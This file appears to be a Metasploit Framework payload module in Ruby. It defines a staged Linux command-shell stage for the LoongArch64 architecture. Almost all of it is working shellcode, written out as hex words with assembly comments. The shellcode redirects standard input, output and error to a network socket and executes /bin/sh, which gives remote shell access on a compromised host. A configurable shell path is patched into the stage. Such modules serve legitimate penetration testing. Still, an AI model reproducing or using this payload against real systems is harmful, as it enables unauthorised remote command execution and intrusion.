##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell',
        'Description' => 'Spawn a command shell (staged)',
        'Author' => ['bcoles'], # LoongArch64 shellcode and staged payload
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html']
        ],
        'Session' => Msf::Sessions::CommandShellUnix,
        'Stage' => {
          'Payload' => [
            # dup3(socket, fd, 0) for stderr, stdout, and stdin
            0x0380600b, # ori a7,zero,24 (SYS_dup3)
            0x03800c05, # ori a1,zero,3
            0x03800006, # ori a2,zero,0
            0x001502e4, # or a0,s0,zero
            0x02fffca5, # addi.d a1,a1,-1
            0x002b0000, # syscall 0
            0x5ffff4a0, # bne a1,zero,dup_loop

            # execve(shell, [shell, NULL], NULL)
            0x0383740b, # ori a7,zero,221 (SYS_execve)
            0x18000004, # pcaddi a0,0
            0x02c0b084, # addi.d a0,a0,44 (shell path)
            0x02ffc063, # addi.d sp,sp,-16
            0x29c00064, # st.d a0,sp,0
            0x29c02060, # st.d zero,sp,8
            0x00150065, # or a1,sp,zero
            0x03800006, # ori a2,zero,0
            0x002b0000, # syscall 0

            # exit(0)
            0x03800004, # ori a0,zero,0
            0x0381740b, # ori a7,zero,93 (SYS_exit)
            0x002b0000, # syscall 0

            # Shell path (16 bytes, patched by generate_stage)
            0x6e69622f,
            0x0068732f,
            0x00000000,
            0x00000000
          ].pack('V*')
        }
      )
    )

    register_options([
      OptString.new('SHELL', [true, 'The shell to execute.', '/bin/sh'])
    ])
  end

  def generate_stage(opts = {})
    stage = super.dup
    shell = datastore['SHELL'].to_s.b
    raise ArgumentError, 'The specified shell must be less than 16 bytes.' if shell.bytesize >= 16

    stage[76, 16] = shell.ljust(16, "\x00")
    stage
  end
end
